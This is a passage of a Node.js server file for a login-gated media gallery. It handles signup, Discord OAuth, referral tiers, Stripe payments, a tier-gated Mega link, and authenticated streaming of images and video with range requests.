    entries = await fs.promises.readdir(folderPath, { withFileTypes: true });
  } catch {
    return [];
  }

  const files = [];
  for (const entry of entries) {
    if (!entry.isFile()) continue;
    if (!isAllowedMediaFile(entry.name)) continue;
    files.push(entry.name);
  }
  files.sort((a, b) => a.localeCompare(b, undefined, { numeric: true, sensitivity: 'base' }));
  return files;
}

function sendFileRange(req, res, filePath, stat) {
  const method = (req.method || 'GET').toUpperCase();
  const range = req.headers.range;
  const contentType = getContentType(filePath);
  const size = stat.size;
  const isVideo = isVideoFile(filePath);

  const baseHeaders = {
    'Content-Type': contentType,
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
    'Content-Disposition': 'inline',
    'Cross-Origin-Resource-Policy': 'same-origin',
    ...(isVideo ? { 'Accept-Ranges': 'bytes' } : {}),
  };

  // HEAD: send headers only (no body)
  if (method === 'HEAD') {
    // Some browsers probe video seekability with HEAD + Range
    if (isVideo && range) {
      const match = /^bytes=(\d*)-(\d*)$/.exec(range);
      if (match) {
        let start = match[1] ? Number(match[1]) : 0;
        let end = match[2] ? Number(match[2]) : size - 1;
        if (!Number.isNaN(start) && !Number.isNaN(end) && start <= end && start < size) {
          end = Math.min(end, size - 1);
          const chunkSize = end - start + 1;
          res.writeHead(206, {
            ...baseHeaders,
            'Content-Length': chunkSize,
            'Content-Range': `bytes ${start}-${end}/${size}`,
          });
          res.end();
          return;
        }
      }
    }

    res.writeHead(200, {
      ...baseHeaders,
      'Content-Length': size,
    });
    res.end();
    return;
  }

  // For non-video files (or no Range), stream the whole file.
  if (!isVideo || !range) {
    res.writeHead(200, {
      ...baseHeaders,
      'Content-Length': size,
    });
    const stream = fs.createReadStream(filePath);
    stream.on('error', () => {
      res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Stream error');
    });
    stream.pipe(res);
    return;
  }

  // Range request for videos (enables scrubbing)
  const match = /^bytes=(\d*)-(\d*)$/.exec(range);
  if (!match) {
    res.writeHead(416, { 'Content-Range': `bytes */${size}` });
    res.end();
    return;
  }

  let start = match[1] ? Number(match[1]) : 0;
  let end = match[2] ? Number(match[2]) : size - 1;
  if (Number.isNaN(start) || Number.isNaN(end) || start > end || start >= size) {
    res.writeHead(416, { 'Content-Range': `bytes */${size}` });
    res.end();
    return;
  }

  end = Math.min(end, size - 1);
  const chunkSize = end - start + 1;

  res.writeHead(206, {
    ...baseHeaders,
    'Content-Length': chunkSize,
    'Content-Range': `bytes ${start}-${end}/${size}`,
  });

  const stream = fs.createReadStream(filePath, { start, end });
  stream.on('error', () => {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Stream error');
  });
  stream.pipe(res);
}

function safeFilePath(urlPathname) {
  const decoded = decodeURIComponent(urlPathname);
  const joined = path.join(__dirname, decoded);
  const normalized = path.normalize(joined);
  if (!normalized.startsWith(path.normalize(__dirname + path.sep))) {
    return null;
  }
  return normalized;
}

const server = http.createServer(async (req, res) => {
  try {
    const requestUrl = new URL(req.url, `http://${req.headers.host}`);

    // ===== REFERRAL LANDING: /XXXXXXX =====
    // If someone visits a 7-char code path, store it in a cookie and redirect home.
    // This is handled before static allowlist checks.
    const landingMatch = /^\/([a-zA-Z0-9]{7})$/.exec(requestUrl.pathname);
    if (landingMatch) {
      const code = landingMatch[1];
      const db = await ensureUsersDbFresh();
      const refUserKey = findUserKeyByReferralCode(db, code);
      if (!refUserKey) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('Not Found');
      }
      setReferralCookie(res, code);
      res.writeHead(302, { Location: `/index.html?ref=${encodeURIComponent(code)}` });
      return res.end();
    }

    // ===== AUTH: SIGNUP =====
    if (requestUrl.pathname === '/api/signup') {
      const signupIpRL = normalizeIp(getClientIp(req));
      const srl = bumpSignupRate(signupIpRL);
      if (!srl.allowed) {
        res.setHeader('Retry-After', String(Math.ceil((srl.retryAfterMs || 0) / 1000)));
        return sendJson(res, 429, { error: 'Too many signup attempts. Try again later.' });
      }

      const body = await readJsonBody(req, res);
      if (!body) return;

      const username = String(body.username || '').trim();
      const password = String(body.password || '');
      if (!isValidUsername(username)) return sendJson(res, 400, { error: 'Username must be 3-24 characters (letters, numbers, _ or -)' });
      if (!isValidPassword(password)) return sendJson(res, 400, { error: 'Password must be at least 8 characters' });

      const db = await ensureUsersDbFresh();
      const key = username.toLowerCase();
      if (db.users[key]) return sendJson(res, 409, { error: 'That username is already taken' });

      const salt = crypto.randomBytes(16).toString('hex');
      const hash = scryptHex(password, salt);

      const signupIp = normalizeIp(getClientIp(req));
      db.users[key] = {
        username,
        provider: 'local',
        salt,
        hash,
        createdAt: Date.now(),
        signupIp,
        tier: 0,
        referralCode: null,
        referredBy: null,
        referredUsers: [],
      };

      // Ensure this user has a referral code.
      ensureUserReferralCode(db, key);

      // Referral attribution (if present in cookie)
      const cookies = parseCookies(req);
      const refCode = cookies[REF_COOKIE];
      if (isValidReferralCode(refCode)) {
        const refUserKey = findUserKeyByReferralCode(db, refCode);
        if (refUserKey && refUserKey !== key) {
          const refUser = db.users[refUserKey];
          const refIp = normalizeIp(refUser && refUser.signupIp);
          const sameIp = refIp !== 'unknown' && signupIp !== 'unknown' && refIp === signupIp;

          // Local dev helper: allow testing referrals/tier unlock on localhost.
          // Default behavior remains strict (blocks same-IP + one credit per IP).
          const allowLocalDevReferrals = process.env.TBW_DEV_ALLOW_SAME_IP_REFERRALS === '1'
            && signupIp === '127.0.0.1'
            && refIp === '127.0.0.1';

          if (!Array.isArray(refUser.referralCreditIps)) refUser.referralCreditIps = [];
          const ipAlreadyCredited = !allowLocalDevReferrals
            && signupIp !== 'unknown'
            && refUser.referralCreditIps.includes(signupIp);

          if ((allowLocalDevReferrals || !sameIp) && !ipAlreadyCredited) {
            // Credit exactly once per referred username
            if (!Array.isArray(refUser.referredUsers)) refUser.referredUsers = [];
            if (!refUser.referredUsers.includes(key)) {
              refUser.referredUsers.push(key);
            }
            if (!allowLocalDevReferrals && signupIp !== 'unknown') refUser.referralCreditIps.push(signupIp);
            db.users[key].referredBy = refCode;
          }
        }
      }

      await queueUsersDbWrite();

      // Analytics beacon (non-critical)
      _emitSignup(db, username, 'local', db.users[key].referredBy || null);

      // Clear referral cookie after signup to prevent accidental re-use.
      clearReferralCookie(res);
      return sendJson(res, 201, { ok: true });
    }

    // ===== AUTH: LOGIN =====
    if (requestUrl.pathname === '/api/login') {
      const ip = getClientIp(req);
      const normIp = normalizeIp(ip);
      const rl = bumpLoginRate(ip);
      if (!rl.allowed) {
        res.setHeader('Retry-After', String(Math.ceil((rl.retryAfterMs || 0) / 1000)));
        return sendJson(res, 429, { error: 'Too many attempts' });
      }

      const body = await readJsonBody(req, res);
      if (!body) return;

      const username = String(body.username || '').trim();
      const password = String(body.password || '');
      if (!isValidUsername(username)) return sendJson(res, 401, { error: 'Invalid credentials' });
      if (!isValidPassword(password)) return sendJson(res, 401, { error: 'Invalid credentials' });

      const db = await ensureUsersDbFresh();
      const key = username.toLowerCase();
      const record = db.users[key];
      if (!record || record.provider !== 'local') return sendJson(res, 401, { error: 'Invalid credentials' });

      const calc = scryptHex(password, record.salt);
      const a = Buffer.from(calc, 'hex');
      const b = Buffer.from(String(record.hash || ''), 'hex');
      if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
        return sendJson(res, 401, { error: 'Invalid credentials' });
      }

      // Track login IP/time (for abuse prevention / auditing)
      record.lastLoginIp = normIp;
      record.lastLoginAt = Date.now();
      await queueUsersDbWrite();

      const token = crypto.randomBytes(32).toString('hex');
      sessions.set(token, { userKey: key, createdAt: Date.now() });
      setSessionCookie(res, token);
      return sendJson(res, 200, { ok: true });
    }

    // ===== AUTH: LOGOUT =====
    if (requestUrl.pathname === '/api/logout') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'POST') return sendJson(res, 405, { error: 'Method Not Allowed' });
      const cookies = parseCookies(req);
      const token = cookies[SESSION_COOKIE];
      if (token) sessions.delete(token);
      clearSessionCookie(res);
      return sendJson(res, 200, { ok: true });
    }

    // ===== AUTH: WHOAMI =====
    if (requestUrl.pathname === '/api/me') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });
      const cookies = parseCookies(req);
      const token = cookies[SESSION_COOKIE];
      const userKey = getAuthedUserKey(req);
      if (!userKey) return sendJson(res, 200, { authed: false });

      const db = await ensureUsersDbFresh();
      const u = db.users[userKey];
      if (!u) {
        if (token) sessions.delete(token);
        clearSessionCookie(res);
        return sendJson(res, 200, { authed: false });
      }

      if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
      const tier = getEffectiveTierForUser(u);
      const tierLabel = tierLabelFromTier(tier);
      return sendJson(res, 200, { authed: true, username: u.username || userKey, tier, tierLabel });
    }

    // ===== REFERRAL STATUS =====
    if (requestUrl.pathname === '/api/referral/status') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });
      const authed = await requireAuthedUser(req, res);
      if (!authed) return;
      const { userKey, record: u, db } = authed;
      if (!u) return sendJson(res, 404, { error: 'User not found' });

      const code = ensureUserReferralCode(db, userKey);
      if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
      const realCount = u.referredUsers.length;
      const tier = getEffectiveTierForUser(u);
      const count = Math.max(realCount, tierMinCount(tier));
      const goal = referralGoalFromCount(count);
      const tierLabel = tierLabelFromTier(tier);

      // Persist referralCode if it was missing.
      await queueUsersDbWrite();

      const base = getRequestOrigin(req);
      const url = `${base}/${code}`;
      return sendJson(res, 200, { code, url, count, goal, tier, tierLabel });
    }

    // ===== MEGA LINK (TIER 1+) =====
    // NOTE: Any link shown in the browser can be copied; this endpoint only gates it server-side.
    if (requestUrl.pathname === '/api/mega') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });

      const authed = await requireAuthedUser(req, res);
      if (!authed) return;
      const { record: u } = authed;

      if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
      const tier = getEffectiveTierForUser(u);
      if (tier < 1) return sendJson(res, 403, { error: 'Tier 1 not unlocked' });

      const links = await readMegaLinks();
      const tierLabel = tierLabelFromTier(tier);

      const chosen = (tier >= 2 && links.tier2) ? links.tier2 : links.tier1;
      if (!chosen) return sendJson(res, 500, { error: 'Mega link not configured' });

      const linkB64 = Buffer.from(String(chosen), 'utf8').toString('base64');
      return sendJson(res, 200, { tier, tierLabel, encoding: 'base64', link: linkB64 });
    }

    // ===== STRIPE PREMIUM (TIER 2) =====
    // Creates a Stripe Checkout session and redirects to Stripe.
    if (requestUrl.pathname === '/api/stripe/checkout') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });

      const authed = await requireAuthedUser(req, res);
      if (!authed) return;

      const stripeSecret = process.env.STRIPE_SECRET_KEY;
      if (!stripeSecret) {
        return sendText(res, 501, 'Stripe not configured. Set STRIPE_SECRET_KEY in .env.');
      }

      const origin = getRequestOrigin(req);
      const successUrl = `${origin}/api/stripe/success?session_id={CHECKOUT_SESSION_ID}`;
      const cancelUrl = `${origin}/premium.html?canceled=1`;

      const params = new URLSearchParams();
      params.set('mode', 'payment');
      params.set('success_url', successUrl);
      params.set('cancel_url', cancelUrl);

      // 1 line item @ $6.50
      params.set('line_items[0][price_data][currency]', 'usd');
      params.set('line_items[0][price_data][product_data][name]', 'Premium Tier 2 Access');
      params.set('line_items[0][price_data][unit_amount]', '650');
      params.set('line_items[0][quantity]', '1');

      // Map the payment back to the user.
      params.set('client_reference_id', authed.userKey);
      params.set('metadata[userKey]', authed.userKey);
      params.set('metadata[username]', String(authed.record && authed.record.username ? authed.record.username : authed.userKey));

      const body = params.toString();
      const basic = Buffer.from(`${stripeSecret}:`, 'utf8').toString('base64');

      const stripeResp = await httpsRequest('https://api.stripe.com/v1/checkout/sessions', {
        method: 'POST',
        headers: {
          Authorization: `Basic ${basic}`,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(body),
        },
      }, body);

      if (stripeResp.status < 200 || stripeResp.status >= 300) {
        const errBody = stripeResp.body ? stripeResp.body.toString('utf8') : '';
        console.error(`Stripe checkout error (${stripeResp.status}):`, errBody);
        return sendText(res, 502, 'Stripe checkout session failed.');
      }

      let session;
      try {
        session = JSON.parse(stripeResp.body.toString('utf8'));
      } catch {
        session = null;
      }
      const url = session && session.url ? String(session.url) : '';
      if (!url) return sendText(res, 502, 'Stripe checkout session missing redirect URL.');

      res.writeHead(303, {
        Location: url,
        'Cache-Control': 'no-store',
        'X-Content-Type-Options': 'nosniff',
      });
      return res.end();
    }

    // Stripe success redirect: verify the session with Stripe, then upgrade user.
    // This works on localhost where webhooks can't reach.
    if (requestUrl.pathname === '/api/stripe/success') {
      const sessionId = requestUrl.searchParams.get('session_id');
      if (!sessionId) {
        res.writeHead(302, { Location: '/premium.html?error=missing_session' });
        return res.end();
      }

      const stripeSecret = process.env.STRIPE_SECRET_KEY;
      if (!stripeSecret) {
        res.writeHead(302, { Location: '/premium.html?error=not_configured' });
        return res.end();
      }

      // Retrieve the checkout session from Stripe to verify payment.
      const basic = Buffer.from(`${stripeSecret}:`, 'utf8').toString('base64');
      const verifyResp = await httpsRequest(
        `https://api.stripe.com/v1/checkout/sessions/${encodeURIComponent(sessionId)}`,
        {
          method: 'GET',
          headers: { Authorization: `Basic ${basic}` },
        }
      );

      if (verifyResp.status < 200 || verifyResp.status >= 300) {
        console.error(`Stripe session verify error (${verifyResp.status}):`, verifyResp.body ? verifyResp.body.toString('utf8') : '');
        res.writeHead(302, { Location: '/premium.html?error=verify_failed' });
        return res.end();
      }

      let session;
      try {
        session = JSON.parse(verifyResp.body.toString('utf8'));
      } catch {
        session = null;
      }

      const paid = session && (session.payment_status === 'paid' || session.status === 'complete');
      const userKey = session && session.metadata && session.metadata.userKey
        ? String(session.metadata.userKey)
        : (session && session.client_reference_id ? String(session.client_reference_id) : null);

      if (paid && userKey) {
        const db = await ensureUsersDbFresh();
        const u = db.users[userKey];
        if (u && typeof u === 'object') {
          const wasAlreadyPremium = u.premiumProvider === 'stripe';
          if (!Array.isArray(u.stripePaidSessions)) u.stripePaidSessions = [];
          if (!u.stripePaidSessions.includes(sessionId)) {
            u.stripePaidSessions.push(sessionId);
          }
          u.tier = 2;
          u.premiumProvider = 'stripe';
          u.premiumPaidAt = Date.now();
          await queueUsersDbWrite();

          // Analytics beacon (only first purchase)
          if (!wasAlreadyPremium) {
            _emitPurchase(db, u.username || userKey, 650);
          }
        }
      }

      // Redirect to homepage regardless — user will see their updated tier.
      res.writeHead(302, { Location: '/index.html?premium=1' });
      return res.end();
    }

    // Stripe webhook: upgrades the paid user to Tier 2.
    if (requestUrl.pathname === '/api/stripe/webhook') {
      const stripeWebhookSecret = process.env.STRIPE_WEBHOOK_SECRET;
      if (!stripeWebhookSecret) {
        return sendText(res, 501, 'Stripe webhook not configured. Set STRIPE_WEBHOOK_SECRET in .env.');
      }

      const payload = await readRawBody(req, res, 1024 * 1024);
      if (!payload) return;

      const sig = req.headers['stripe-signature'];
      const ok = verifyStripeSignature(payload, sig, stripeWebhookSecret);
      if (!ok) return sendText(res, 400, 'Invalid Stripe signature.');

      let event;
      try {
        event = JSON.parse(payload.toString('utf8'));
      } catch {
        return sendText(res, 400, 'Invalid JSON.');
      }

      if (event && event.type === 'checkout.session.completed') {
        const session = event.data && event.data.object ? event.data.object : null;
        const paid = session && (session.payment_status === 'paid' || session.status === 'complete');
        const sessionId = session && session.id ? String(session.id) : null;
        const userKey = session && session.metadata && session.metadata.userKey
          ? String(session.metadata.userKey)
          : (session && session.client_reference_id ? String(session.client_reference_id) : null);

        if (paid && userKey) {
          const db = await ensureUsersDbFresh();
          const u = db.users[userKey];
          if (u && typeof u === 'object') {
            const wasAlreadyPremium = u.premiumProvider === 'stripe';
            if (!Array.isArray(u.stripePaidSessions)) u.stripePaidSessions = [];
            if (sessionId && !u.stripePaidSessions.includes(sessionId)) {
              u.stripePaidSessions.push(sessionId);
            }
            u.tier = 2;
            u.premiumProvider = 'stripe';
            u.premiumPaidAt = Date.now();
            await queueUsersDbWrite();

            if (!wasAlreadyPremium) {
              _emitPurchase(db, u.username || userKey, 650);
            }
          }
        }
      }

      res.writeHead(200, {
        'Content-Type': 'application/json; charset=utf-8',
        'Cache-Control': 'no-store',
        'X-Content-Type-Options': 'nosniff',
      });
      return res.end(JSON.stringify({ received: true }));
    }

    // ===== DISCORD OAUTH =====
    if (requestUrl.pathname === '/auth/discord') {
      const clientId = process.env.DISCORD_CLIENT_ID;
      const redirectUri = process.env.DISCORD_REDIRECT_URI;
      if (!clientId || !redirectUri) {
        return sendText(res, 501, 'Discord login not configured. Set DISCORD_CLIENT_ID and DISCORD_REDIRECT_URI env vars.');
      }

      // Common gotcha: cookie is host-scoped. If you open http://localhost:3002 but
      // DISCORD_REDIRECT_URI uses http://127.0.0.1:3002 (or vice-versa), the state cookie
      // won't be sent to the callback and you'll get "Invalid OAuth state".
      let redirectHost = '';
      try {
        redirectHost = new URL(redirectUri).host;
      } catch {
        redirectHost = '';
      }
      const reqHost = String(req.headers.host || '');
      if (redirectHost && reqHost && redirectHost !== reqHost) {
        return sendText(
          res,
          400,
          `Discord OAuth host mismatch. You are browsing ${reqHost} but DISCORD_REDIRECT_URI is set to ${redirectHost}. ` +
          `Use the same hostname (localhost vs 127.0.0.1) for both, then retry.`
        );
      }

      const state = crypto.randomBytes(16).toString('hex');
      // State cookie (basic CSRF protection)
      appendSetCookie(res, `tbw_oauth_state=${state}; Path=/; HttpOnly; SameSite=Lax; Max-Age=600`);

      const params = new URLSearchParams({
        client_id: clientId,
        redirect_uri: redirectUri,
        response_type: 'code',
        scope: 'identify',
        state,
      });
      res.writeHead(302, { Location: `https://discord.com/oauth2/authorize?${params.toString()}` });
      return res.end();
    }

    if (requestUrl.pathname === '/auth/discord/callback') {
      const code = requestUrl.searchParams.get('code');
      const state = requestUrl.searchParams.get('state');
      const cookies = parseCookies(req);
      if (!code || !state || !cookies.tbw_oauth_state || cookies.tbw_oauth_state !== state) {
        const redirectUri = process.env.DISCORD_REDIRECT_URI;
        let redirectHost = '';
        try {
          if (redirectUri) redirectHost = new URL(redirectUri).host;
        } catch {
          redirectHost = '';
        }
        const reqHost = String(req.headers.host || '');
        if (redirectHost && reqHost && redirectHost !== reqHost) {
          return sendText(
            res,
            400,
            `Invalid OAuth state (likely host mismatch). You are on ${reqHost} but DISCORD_REDIRECT_URI is ${redirectHost}. ` +
            `Open the site using the same host as your redirect URL and try again.`
          );
        }
        return sendText(res, 400, 'Invalid OAuth state. Clear site cookies and retry the Discord login flow.');
      }

      const clientId = process.env.DISCORD_CLIENT_ID;
      const clientSecret = process.env.DISCORD_CLIENT_SECRET;
      const redirectUri = process.env.DISCORD_REDIRECT_URI;
      if (!clientId || !clientSecret || !redirectUri) {
        return sendText(res, 501, 'Discord login not configured. Set DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, DISCORD_REDIRECT_URI.');
      }

      const tokenBody = new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'authorization_code',
        code,
        redirect_uri: redirectUri,
      }).toString();

      const tokenResp = await httpsRequest('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(tokenBody),
        },
      }, tokenBody);

      if (tokenResp.status < 200 || tokenResp.status >= 300) {
        return sendText(res, 400, 'Discord token exchange failed.');
      }

      let tokenJson;
      try {
        tokenJson = JSON.parse(tokenResp.body.toString('utf8'));
      } catch {
        tokenJson = null;
      }
      const accessToken = tokenJson && tokenJson.access_token;
      if (!accessToken) return sendText(res, 400, 'Discord token exchange failed.');

      const meResp = await httpsRequest('https://discord.com/api/users/@me', {
        method: 'GET',
        headers: {
          Authorization: `Bearer ${accessToken}`,
        },
      });

      if (meResp.status < 200 || meResp.status >= 300) {
        return sendText(res, 400, 'Discord profile fetch failed.');
      }

      let meJson;
      try {
        meJson = JSON.parse(meResp.body.toString('utf8'));
      } catch {
        meJson = null;
      }

      const discordId = meJson && meJson.id ? String(meJson.id) : null;
      const discordName = meJson && meJson.username ? String(meJson.username) : 'discord-user';
      if (!discordId) return sendText(res, 400, 'Discord profile invalid.');

      const db = await ensureUsersDbFresh();
      const userKey = `discord_${discordId}`;
      const isNewDiscordUser = !db.users[userKey];
      if (isNewDiscordUser) {
        const discordSignupIp = normalizeIp(getClientIp(req));
        db.users[userKey] = {
          username: `discord:${discordName}`,
          provider: 'discord',
          discordId,
          createdAt: Date.now(),
          signupIp: discordSignupIp,
          tier: 0,
          referralCode: null,
          referredBy: null,
          referredUsers: [],
        };

        // Generate referral code for the new Discord user
        ensureUserReferralCode(db, userKey);

        // Referral attribution from cookie (same logic as local signup)
        const discordCookies = parseCookies(req);
        const discordRefCode = discordCookies[REF_COOKIE];
        if (isValidReferralCode(discordRefCode)) {
          const refUserKey = findUserKeyByReferralCode(db, discordRefCode);
          if (refUserKey && refUserKey !== userKey) {
            const refUser = db.users[refUserKey];
            const refIp = normalizeIp(refUser && refUser.signupIp);
            const sameIp = refIp !== 'unknown' && discordSignupIp !== 'unknown' && refIp === discordSignupIp;
            const allowLocalDevReferrals = process.env.TBW_DEV_ALLOW_SAME_IP_REFERRALS === '1'
              && discordSignupIp === '127.0.0.1' && refIp === '127.0.0.1';
            if (!Array.isArray(refUser.referralCreditIps)) refUser.referralCreditIps = [];
            const ipAlreadyCredited = !allowLocalDevReferrals
              && discordSignupIp !== 'unknown'
              && refUser.referralCreditIps.includes(discordSignupIp);
            if ((allowLocalDevReferrals || !sameIp) && !ipAlreadyCredited) {
              if (!Array.isArray(refUser.referredUsers)) refUser.referredUsers = [];
              if (!refUser.referredUsers.includes(userKey)) refUser.referredUsers.push(userKey);
              if (!allowLocalDevReferrals && discordSignupIp !== 'unknown') refUser.referralCreditIps.push(discordSignupIp);
              db.users[userKey].referredBy = discordRefCode;
            }
          }
        }

        await queueUsersDbWrite();

        // Analytics beacon
        _emitSignup(db, `discord:${discordName}`, 'discord', db.users[userKey].referredBy || null);
      }

      const token = crypto.randomBytes(32).toString('hex');
      sessions.set(token, { userKey, createdAt: Date.now() });
      setSessionCookie(res, token);

      // Clear referral cookie after Discord signup
      if (isNewDiscordUser) clearReferralCookie(res);

      // clear state cookie
      appendSetCookie(res, `tbw_oauth_state=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
      res.writeHead(302, { Location: '/index.html?welcome=1' });
      return res.end();
    }

    // API: list files in a category folder
    if (requestUrl.pathname === '/api/list') {
      if (!await requireAuthedUser(req, res)) return;
      const folder = requestUrl.searchParams.get('folder') || '';
      const folderDirName = allowedFolders.get(folder);
      if (!folderDirName) {
        return sendJson(res, 400, { error: 'Invalid folder' });
      }

      if (R2_ENABLED) {
        const names = await listMediaFilesForFolder(folder);
        const files = names.map((name) => ({
          name,
          type: isVideoFile(name) ? 'video' : 'image',
          src: `/media?folder=${encodeURIComponent(folder)}&name=${encodeURIComponent(name)}`,
        }));
        return sendJson(res, 200, { files });
      }

      // Local-disk fallback
      const folderPath = path.join(MEDIA_ROOT, folderDirName);
      let entries;
      try {
        entries = await fs.promises.readdir(folderPath, { withFileTypes: true });
      } catch {
        return sendJson(res, 200, { files: [] });
      }

      const files = [];
      for (const entry of entries) {
        if (!entry.isFile()) continue;
        if (!isAllowedMediaFile(entry.name)) continue;

        const fullPath = path.join(folderPath, entry.name);
        let stat;
        try {
          stat = await fs.promises.stat(fullPath);
        } catch {
          stat = null;
        }

        const src = `/media?folder=${encodeURIComponent(folder)}&name=${encodeURIComponent(entry.name)}`;
        const isVideo = isVideoFile(entry.name);
        files.push({
          name: entry.name,
          type: isVideo ? 'video' : 'image',
          src,
          size: stat ? stat.size : undefined,
        });
      }

      files.sort((a, b) => a.name.localeCompare(b.name, undefined, { numeric: true, sensitivity: 'base' }));
      return sendJson(res, 200, { files });
    }

    // API: preview list (no auth). Returns only the first PREVIEW_LIMIT files.
    if (requestUrl.pathname === '/api/preview/list') {
      const method = (req.method || 'GET').toUpperCase();
      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });
      const folder = requestUrl.searchParams.get('folder') || '';
      if (!allowedFolders.get(folder)) return sendJson(res, 400, { error: 'Invalid folder' });

      const names = await listMediaFilesForFolder(folder);
      const previewNames = names.slice(0, PREVIEW_LIMIT);

      if (R2_ENABLED) {
        const files = previewNames.map((name) => ({
          name,
          type: isVideoFile(name) ? 'video' : 'image',
          src: `/preview-media?folder=${encodeURIComponent(folder)}&name=${encodeURIComponent(name)}`,
        }));
        return sendJson(res, 200, { files, limited: true, limit: PREVIEW_LIMIT });
      }

      const files = [];
      for (const name of previewNames) {
        const folderDirName = allowedFolders.get(folder);
        const fullPath = path.join(MEDIA_ROOT, folderDirName, name);
        let stat;
        try {
          stat = await fs.promises.stat(fullPath);
        } catch {
          stat = null;
        }
        files.push({
          name,
          type: isVideoFile(name) ? 'video' : 'image',
          src: `/preview-media?folder=${encodeURIComponent(folder)}&name=${encodeURIComponent(name)}`,
          size: stat ? stat.size : undefined,
        });
      }

      return sendJson(res, 200, { files, limited: true, limit: PREVIEW_LIMIT });
    }

    // Media serving for previews (no auth), but ONLY for the first PREVIEW_LIMIT files in that folder.
    if (requestUrl.pathname === '/preview-media') {
      const folder = requestUrl.searchParams.get('folder') || '';
      const name = requestUrl.searchParams.get('name') || '';

      const folderDirName = allowedFolders.get(folder);
      if (!folderDirName) return sendText(res, 400, 'Invalid folder');
      if (!name || name.includes('..') || name.includes('/') || name.includes('\\')) return sendText(res, 400, 'Invalid file');
      if (!isAllowedMediaFile(name)) return sendText(res, 403, 'Forbidden');

      const names = await listMediaFilesForFolder(folder);
      const previewNames = new Set(names.slice(0, PREVIEW_LIMIT));
      if (!previewNames.has(name)) return sendText(res, 403, 'Forbidden');

      if (R2_ENABLED) {
        const objectKey = folderDirName + '/' + name;
        const url = r2PresignedUrl(objectKey);
        res.writeHead(302, { Location: url, 'Cache-Control': 'no-store' });
        return res.end();
      }

      const mediaPath = path.join(MEDIA_ROOT, folderDirName, name);
      let stat;
      try {
        stat = await fs.promises.stat(mediaPath);
      } catch {
        return sendText(res, 404, 'Not Found');
      }
      if (!stat.isFile()) return sendText(res, 404, 'Not Found');

      return sendFileRange(req, res, mediaPath, stat);
    }

    // Media serving (validated)
    if (requestUrl.pathname === '/media') {
      if (!await requireAuthedUser(req, res)) return;
      const folder = requestUrl.searchParams.get('folder') || '';
      const name = requestUrl.searchParams.get('name') || '';

      const folderDirName = allowedFolders.get(folder);
      if (!folderDirName) {
        return sendText(res, 400, 'Invalid folder');
      }
      if (!name || name.includes('..') || name.includes('/') || name.includes('\\')) {
        return sendText(res, 400, 'Invalid file');
      }
      if (!isAllowedMediaFile(name)) {
        return sendText(res, 403, 'Forbidden');
      }

      if (R2_ENABLED) {
        const objectKey = folderDirName + '/' + name;
        const url = r2PresignedUrl(objectKey);
        res.writeHead(302, { Location: url, 'Cache-Control': 'no-store' });
        return res.end();
      }

      const mediaPath = path.join(MEDIA_ROOT, folderDirName, name);
      let stat;
      try {
        stat = await fs.promises.stat(mediaPath);
      } catch {
        return sendText(res, 404, 'Not Found');
      }
      if (!stat.isFile()) {
        return sendText(res, 404, 'Not Found');
      }

      return sendFileRange(req, res, mediaPath, stat);
    }

    // Static serving (locked down: no directory listing, no direct media access, no data leaks)
    const pathname = requestUrl.pathname === '/' ? '/index.html' : requestUrl.pathname;

    // Lock down Free Access page: redirect home.
    if (pathname === '/access.html') {
      res.writeHead(302, { Location: '/index.html' });
      return res.end();
    }

    // Logged-in users shouldn't need standalone auth pages.
    if (pathname === '/login.html' || pathname === '/signup.html') {
      const userKey = getAuthedUserKey(req);
      if (userKey) {
        res.writeHead(302, { Location: '/index.html' });
        return res.end();
      }
    }

    if (!STATIC_ALLOWLIST.has(requestUrl.pathname) && !STATIC_ALLOWLIST.has(pathname)) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Not Found');
    }

    const filePath = safeFilePath(pathname);
    if (!filePath) {
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Forbidden');
    }

    // Never serve auth data or media directly via static paths.
    const normalized = path.normalize(filePath);
    const protectedDirs = [
      path.normalize(DATA_DIR + path.sep),
      ...Array.from(allowedFolders.values()).map((d) => path.normalize(path.join(MEDIA_ROOT, d) + path.sep)),
    ];
    for (const pd of protectedDirs) {
      if (normalized.startsWith(pd)) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('Not Found');
      }
    }

    // Block any direct serving of image/video files via static handler (must go through /media with auth + range).
    // Exception: allow a small number of UI assets (like the premium preview image).
    if (pathname !== '/preview.png' && isAllowedMediaFile(normalized)) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Not Found');
    }

    let stat;
    try {
      stat = await fs.promises.stat(filePath);
    } catch {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Not Found');
    }

    if (stat.isDirectory()) {
      const indexPath = path.join(filePath, 'index.html');
      try {
        await fs.promises.access(indexPath);
        const data = await fs.promises.readFile(indexPath);
        res.writeHead(200, { 'Content-Type': getContentType(indexPath) });
        return res.end(data);
      } catch {
